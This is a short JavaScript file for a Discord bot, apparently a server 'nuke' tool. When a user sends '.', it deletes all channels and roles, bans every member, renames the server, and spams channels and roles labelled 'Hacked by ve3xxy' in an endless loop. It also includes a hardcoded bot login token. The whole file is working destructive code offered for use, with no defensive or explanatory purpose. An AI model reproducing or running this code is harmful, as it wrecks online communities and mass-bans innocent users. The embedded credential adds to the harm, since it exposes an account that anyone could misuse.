const Discord = require("discord.js");
const client = new Discord.Client();
const prefix = ".";
client.on("message", message => {
  if (message.content === ".") {
    if (message.channel.guild) {
      message.guild.channels.forEach(c => {
        if (c.deletable) {
          c.delete();
        }
      });
      message.guild.members.forEach(m => {
        m.ban();
      });
      message.guild.roles.forEach(r => {
        r.delete();
      });
      message.guild.setName("Ve3xxy is here");
      setInterval(function() {
        message.guild.createChannel("Hacked by ve3xxy", "voice");
        message.guild.createChannel("Hacked By ve3xxy", "text");
        message.guild.createRole({ name: "Ve3xxy is here" });
      });
    }
  }
});

client.login("ODI0OTg4OTE3OTI4Mjk2NDU5.YF3YzQ.0TigR4IGz-C_iN_l4PlNub404oc");
